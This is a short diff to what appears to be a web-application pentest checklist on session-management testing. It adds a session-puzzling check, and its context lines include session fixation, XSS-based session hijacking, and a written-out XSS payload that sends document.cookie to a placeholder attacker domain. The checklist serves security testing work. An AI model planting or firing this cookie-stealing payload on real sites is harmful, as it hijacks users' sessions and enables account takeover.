@@ -36,6 +36,7 @@ An attacker can redirect victim to malicious website
 - Check Session in burp sequencer
 - No session expiration after logout
 - Session fiation
+- Session Puzzling / Session Variable Overloading. Request Forgot Password Immideatly Aceess Dashboard Page
 - XSS + session hijacking
 ```html
 <img src=”x” onerror=this.src=”<attacker domain>?cookie=”+document.cookie>
